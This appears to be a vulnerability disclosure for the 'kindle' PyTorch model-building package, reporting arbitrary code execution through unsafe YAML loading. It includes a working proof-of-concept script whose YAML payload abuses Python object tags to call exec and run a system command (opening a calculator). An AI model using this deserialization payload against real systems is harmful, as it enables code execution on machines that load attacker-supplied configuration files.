# Description

`Kindle` is an easy model build package for PyTorch. Building a deep learning model became so simple that almost all model can be made by copy and paste from other existing model codes, which is vulnerable to `Arbitary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
pip3 install kindle
```

### Run exploit.py
```
import os
#os.sysem('pip3 install kindle')
from kindle.generator import custom_yaml_module
payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('config.yml','w+').write(payload)
custom_yaml_module.YamlModuleGenerator('config.yml')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
